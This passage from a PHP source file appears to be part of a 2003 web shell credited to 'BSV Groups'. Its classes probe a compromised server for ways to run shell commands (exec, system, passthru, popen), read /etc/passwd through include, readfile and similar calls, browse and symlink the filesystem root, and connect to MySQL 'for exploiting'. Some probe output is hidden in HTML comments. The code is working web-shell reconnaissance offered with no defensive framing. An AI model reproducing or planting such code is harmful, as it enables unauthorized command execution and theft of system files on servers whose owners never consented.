        //if ($output = `$cmd`)) { $this->output_state(1, "backtick"); $sys = true; } else { $this->output_state(0, "backtick"); }
        if ($sys) { return 1; $this->cmd_state = "yes"; } else { return ; }
        }

        function reading_checks($file = "/etc/passwd") {
            if (@function_exists("require_once")) {
            echo "<!--";
            if (@require_once($file)) { echo "-->"; $this->output_state(1, "require_once"); $sys = true; } else { echo "-->"; $this->output_state(0, "require_once"); }
            }
            if (@function_exists("require")) {
            echo "<!--";
            if (@require($file)) { echo "-->"; $this->output_state(1, "require    "); $sys = true; } else { echo "-->"; $this->output_state(0, "require    "); }
            }
            if (@function_exists("include")) {
            echo "<!--";
            if (@include($file)) { echo "-->"; $this->output_state(1, "include   "); $sys = true; } else { echo "-->"; $this->output_state(0, "include   "); }
            }
            //if (@function_exists("highlight_file")) {
            echo "<!--";
            if (@highlight_file($file)) { echo "-->"; $this->output_state(1, "highlight_file"); $sys = true; } else { echo "-->"; $this->output_state(0, "highlight_file"); }
            //}
            //if (@function_exists("virtual")) {
            echo "<!--";
            if (@virtual($file)) { echo "-->"; $this->output_state(1, "virtual   "); $sys = true; } else { echo "-->"; $this->output_state(0, "virtual  "); }
            //}
            if (@function_exists("file_get_contents")) {
            if (@file_get_contents($file)) { $this->output_state(1, "filegetcontents"); $sys = true; } else { $this->output_state(0, "filegetcontents"); }
            } else {
            $this->output_state(0, "filegetcontents");
            }
        echo "<!-- ";
        if (@show_source($file)) { echo " -->"; $this->output_state(1, "show_source"); $this->read_method = "show_source"; $sys = true; } else { echo " -->"; $this->output_state(0, "show_source"); }
        echo "<!-- ";
        if (@readfile($file)) { echo " -->"; $this->output_state(1, "readfile"); $this->read_method = "readfile"; $sys = true; } else { echo " -->"; $this->output_state(0, "readfile"); }
        if (@fopen($file, "r")) { $this->output_state(1, "fopen   "); $this->read_method = "fopen"; $sys = true; } else { $this->output_state(0, "fopen   "); }
        if (@file($file)) { $this->output_state(1, "file     "); $this->read_method = "file"; $sys = true; } else { $this->output_state(0, "file     "); }
        if ($sys) { return 1; } else { return ; }
        }

        function miscfile_checks() {
        $currentdir = @getcwd();
        $scriptpath = $_SERVER["PATH_TRANSLATED"];
        if (@opendir($currentdir)) {
            $this->output_state(2, "opendir \$cwd");
                $dp = @opendir("$currentdir");
                $files="";
                $this->browse_state = "lim";
                while($file = @readdir($dp)) { $files .= $file; }
                if (@strstr($files, '.')) {  $this->output_state(2, "readdir \$cwd"); $this->browse_state = "lim"; } else { $this->output_state(0, "readdir \$cwd"); }

            } else { $this->output_state(0, "opendir \$cwd"); }
        if (@opendir("/")) {
            $this->output_state(1, "opendir /");
            $sys = true;
                $dp = @opendir("/");
                $this->browse_state = "yes";
                $files="";
                while($file = @readdir($dp)) { $files .= $file; }
                if (@strstr($files, '.')) {  $this->output_state(1, "readdir /"); $this->browse_state = "yes"; } else { $this->output_state(0, "readdir /"); }
            } else { $this->output_state(0, "opendir /"); }
        if (@mkdir("$currentdir/test", 0777)) { $this->output_state(1, "mkdir   "); $sys = true; } else { $this->output_state(0, "mkdir   "); }
        if (@rmdir("$currentdir/test")) { $this->output_state(1, "rmdir     "); $sys = true; } else { $this->output_state(0, "rmdir     "); }
        if (@copy($scriptpath, "$currentdir/copytest")) {
            $this->output_state(2, "copy    ");
            $sys = true;
                if (@unlink("$currentdir/copytest")) { $this->output_state(2, "unlink  "); $del = true; } else { $this->output_state(0, "unlink  "); }
            } else {
            $this->output_state(0, "copy    ");
        }
        if (@copy($scriptpath, "/tmp/copytest")) {
            $this->output_state(2, "copy2/tmp");
            //$sys = true;
                if (!$del) {
                if (@unlink("tmp/copytest")) { $this->output_state(2, "unlink  "); $del = true; } else { $this->output_state(0, "unlink  "); }
                }
            } else {
            $this->output_state(0, "copy2/tmp");
        }
        if (@link("/", "$currentdir/link2root")) {
                $this->output_state(1, "link      ");
                $sys = true;
                if (!$del) {
                if (@unlink("$currentdir/link2root")) { $this->output_state(2, "unlink  "); $del = true; } else { $this->output_state(0, "unlink  "); }
                }
            } else {
            $this->output_state(0, "link      ");
        }
        if (@symlink("/", "$currentdir/link2root")) {
                $this->output_state(1, "symlink   ");
                $sys = true;
                if (!$del) {
                if (@unlink("$currentdir/link2root")) { $this->output_state(2, "unlink  "); $del = true; } else { $this->output_state(0, "unlink  "); }
                }
            } else {
            $this->output_state(0, "symlink   ");
        }
        if ($sys) { return 1; } else { return ; }
        }

        function mysql_checks() {
            if ($this->mysql_do=="yes") {
                if (@mysql_pconnect($this->mysql_host, $this->mysql_user, $this->mysql_pass)) {
                $this->output_state(1, "mysql_pconnect"); $mstate = 1;
                } else { $this->output_state(0, "mysql_pconnect"); $mstate = 0; }
            } else { $this->output_state(3, "mysql_pconnect"); $mstate = 2; }
            if ($this->mysql_do=="yes") {
                if (@mysql_connect($this->mysql_host, $this->mysql_user, $this->mysql_pass)) {
                $this->output_state(1, "mysql_connect"); $mstate = 1;
                } else { $this->output_state(0, "mysql_connect"); $mstate = 0; }
            } else { $this->output_state(3, "mysql_connect"); $mstate = 2; }
            if ($this->mysql_state=="fail") {
            echo "\n\n<!-- MYSQL ERROR:\n".mysql_error()."\n-->\n\n";
            echo "<script> alert(\"you have a mysql error:\\n ".mysql_error()."\\n\\nbecause of this the mysql exploiting will be off\"); </script>";
            }
            return $mstate;
        }
    }

    class php_check_silent
    {

        function php_check_silent($host="notset", $username="", $pass="", $db="") {
            if ($host!="notset") {
            $this->mysql_do = "yes";
            $this->mysql_host = $host;
            $this->mysql_user = $username;
            $this->mysql_pass = $pass;
            $this->mysql_db = $db;
            } else { $this->mysql_do = "no"; }

        $this->mainstate = "safe";

        if ($this->system_checks("/bin/ls")) { $this->output_mainstate(1, "system checks"); } else { $this->output_mainstate(0, "system checks"); }
        if ($this->reading_checks()) { $this->output_mainstate(1, "reading checks"); } else { $this->output_mainstate(0, "reading checks"); }
        if ($this->miscfile_checks()) { $this->output_mainstate(1, "misc filesystem checks"); } else { $this->output_mainstate(0, "misc filesystem checks"); }
        $this->mysql_checks();
        }


        function output_state($state = 0, $name = "function") {
            if ($state==0) {
            //echo "$name\t\tfailed\n";
            }
            if ($state==1) {
            //echo "$name\t\t<font color=red>OK</font>\n";
            }
            if ($state==2) {
            //echo "$name\t\t<font color=yellow>OK</font>\n";
            }
        }
        function output_mainstate($state = 0, $name = "functions") {
            if ($state==1) {
            //echo "\n$name returned: <font color=red>VULNERABLE</font>\n\n";
            $this->mainstate = "unsafe";
            } else {
            //echo "\n$name returned: <font color=green>OK</font>\n\n";
            }
        }

        function system_checks($cmd = "/bin/ls") {
        if ($pp = popen($cmd, "r")) {
            if (fread($pp, 2096)) {
            $this->output_state(1, "popen     ");
            $sys = true;
            } else {
            $this->output_state(0, "popen     ");
            }
        } else { $this->output_state(0, "popen     "); }
        if (@exec($cmd)) { $this->output_state(1, "exec     "); $sys = true; $this->cmd_method = "exec"; } else { $this->output_state(0, "exec     "); }
        if (@shell_exec($cmd)) { $this->output_state(1, "shell_exec"); $sys = true; $this->cmd_method = "shel_exec"; } else { $this->output_state(0, "shell_exec"); }
        echo "<!-- ";
        if (@passthru($cmd)) { echo " -->"; $this->output_state(1, "passthru"); $sys = true; $this->cmd_method = "passthru"; } else { echo " -->"; $this->output_state(0, "passthru"); }
        echo "<!-- ";
        if (@system($cmd)) { echo " -->"; $this->output_state(1, "system   "); $sys = true; $this->cmd_method = "system"; } else { echo " -->"; $this->output_state(0, "system   "); }
        //if ($output = `$cmd`)) { $this->output_state(1, "backtick"); $sys = true; } else { $this->output_state(0, "backtick"); }
        if ($sys) { return 1; $this->cmd_state = "yes"; } else { return ; }
        }

        function reading_checks($file = "/etc/passwd") {
            if (@function_exists("require_once")) {
            if (@require_once($file)) { $this->output_state(1, "require_once"); $sys = true; } else { $this->output_state(0, "require_once"); }
            }
            if (@function_exists("require")) {
            if (@require($file)) { $this->output_state(1, "require"); $sys = true; } else { $this->output_state(0, "require"); }
            }
            if (@function_exists("include")) {
            if (@include($file)) { $this->output_state(1, "include "); $sys = true; } else { $this->output_state(0, "include "); }
            }
            if (@function_exists("file_get_contents")) {
            if (@file_get_contents($file)) { $this->output_state(1, "filegetcontents"); $sys = true; } else { $this->output_state(0, "filegetcontents"); }
            } else {
            $this->output_state(0, "filegetcontents");
            }
        echo "<!-- ";
        if (@show_source($file)) { echo " -->"; $this->output_state(1, "show_source"); $this->read_method = "show_source"; $sys = true; } else { echo " -->"; $this->output_state(0, "show_source"); }
        echo "<!-- ";
        if (@readfile($file)) { echo " -->"; $this->output_state(1, "readfile"); $this->read_method = "readfile"; $sys = true; } else { echo " -->"; $this->output_state(0, "readfile"); }
        if (@fopen($file, "r")) { $this->output_state(1, "fopen   "); $this->read_method = "fopen"; $sys = true; } else { $this->output_state(0, "fopen   "); }
        if (@file($file)) { $this->output_state(1, "file     "); $this->read_method = "file"; $sys = true; } else { $this->output_state(0, "file     "); }
        if ($sys) { return 1; } else { return ; }
        }

        function miscfile_checks() {
        $currentdir = @getcwd();
        $scriptpath = $_SERVER["PATH_TRANSLATED"];
        if (@opendir($currentdir)) {
            $this->output_state(2, "opendir \$cwd");
                $dp = @opendir("$currentdir");
                $files="";
                $this->browse_state = "lim";
                while($file = @readdir($dp)) { $files .= $file; }
                if (@strstr($files, '.')) {  $this->output_state(2, "readdir \$cwd"); $this->browse_state = "lim"; } else { $this->output_state(0, "readdir \$cwd"); }

            } else { $this->output_state(0, "opendir \$cwd"); }
        if (@opendir("/")) {
            $this->output_state(1, "opendir /");
            $sys = true;
                $dp = @opendir("/");
                $this->browse_state = "yes";
                $files="";
                while($file = @readdir($dp)) { $files .= $file; }
                if (@strstr($files, '.')) {  $this->output_state(1, "readdir /"); $this->browse_state = "yes"; } else { $this->output_state(0, "readdir /"); }
            } else { $this->output_state(0, "opendir /"); }
        if (@mkdir("$currentdir/test", 0777)) { $this->output_state(1, "mkdir   "); $sys = true; } else { $this->output_state(0, "mkdir   "); }
        if (@rmdir("$currentdir/test")) { $this->output_state(1, "rmdir     "); $sys = true; } else { $this->output_state(0, "rmdir     "); }
        if (@copy($scriptpath, "$currentdir/copytest")) {
            $this->output_state(2, "copy    ");
            $sys = true;
                if (@unlink("$currentdir/copytest")) { $this->output_state(2, "unlink  "); $del = true; } else { $this->output_state(0, "unlink  "); }
            } else {
            $this->output_state(0, "copy    ");
        }
        if (@copy($scriptpath, "/tmp/copytest")) {
            $this->output_state(2, "copy2/tmp");
            //$sys = true;
                if (!$del) {
                if (@unlink("tmp/copytest")) { $this->output_state(2, "unlink  "); $del = true; } else { $this->output_state(0, "unlink  "); }
                }
            } else {
            $this->output_state(0, "copy2/tmp");
        }
        if (@link("/", "$currentdir/link2root")) {
                $this->output_state(1, "link      ");
                $sys = true;
                if (!$del) {
                if (@unlink("$currentdir/link2root")) { $this->output_state(2, "unlink  "); $del = true; } else { $this->output_state(0, "unlink  "); }
                }
            } else {
            $this->output_state(0, "link      ");
        }
        if (@symlink("/", "$currentdir/link2root")) {
                $this->output_state(1, "symlink   ");
                $sys = true;
                if (!$del) {
                if (@unlink("$currentdir/link2root")) { $this->output_state(2, "unlink  "); $del = true; } else { $this->output_state(0, "unlink  "); }
                }
            } else {
            $this->output_state(0, "symlink   ");
        }
        if ($sys) { return 1; } else { return ; }
        }
        function mysql_checks() {
            if ($this->mysql_do=="yes") {
                if (@mysql_pconnect($this->mysql_host, $this->mysql_user, $this->mysql_pass)) {
                $this->output_state(1, "mysql_pconnect"); $mstate = 1; $this->mysql_state = "ok";
                } else { $this->output_state(0, "mysql_pconnect"); $mstate = 0; $this->mysql_state = "fail"; }
            } else { $this->output_state(3, "mysql_pconnect"); $mstate = 2; $this->mysql_state = "pass"; }
            if ($this->mysql_do=="yes") {
                if (@mysql_connect($this->mysql_host, $this->mysql_user, $this->mysql_pass)) {
                $this->output_state(1, "mysql_connect"); $mstate = 1; $this->mysql_state = "ok";
                } else { $this->output_state(0, "mysql_connect"); $mstate = 0; $this->mysql_state = "fail"; }
            } else { $this->output_state(3, "mysql_connect"); $mstate = 2; $this->mysql_state = "pass"; }
            if ($this->mysql_state=="fail") {
            echo "<!-- MYSQL ERROR:\n".mysql_error()."\n-->";
            echo "<script> alert(\"you have a mysql error:\\n ".mysql_error()."\\n\\nbecause of this the mysql exploiting will be off\"); </script>";
            }
            return $mstate;
        }
    }



// the end :]
?>
<center>Copyright © 2003 <a href="http://www.bansacviet.net">BSV Groups</a>
<br>PHP Shell Support by <a href="mailto:admin@bansacviet.net">DTN</a> 
